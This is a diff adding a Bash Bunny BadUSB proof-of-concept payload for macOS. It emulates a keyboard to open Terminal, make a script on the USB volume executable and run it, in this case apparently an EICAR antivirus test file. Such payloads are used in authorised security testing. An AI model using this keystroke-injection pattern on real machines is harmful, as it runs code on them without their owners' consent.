@@ -1,0 +1,32 @@
+#!/bin/bash
+# Title:  MacOS_EICAR
+# Description:  Bad USB PoC for MacOS.    	
+# Author:  Ciph3rtxt	
+# Category:  PoC 	
+# Target:  MacOS 		
+# Attackmodes: 	HID STORAGE
+
+# Setup
+LED R
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+path=/Volumes/BashBunny/payloads/$SWITCH_POSITION
+
+
+# Execute Attack
+LED R
+DELAY 200
+RUN OSX terminal
+Q DELAY 2000
+Q STRING cd
+Q ENTER
+Q DELAY 200
+Q STRING chmod a+x $path/eicar.sh
+Q ENTER
+Q DELAY 200
+Q STRING $path/eicar.sh
+Q ENTER
+Q DELAY 200
+
+# Complete
+LED G
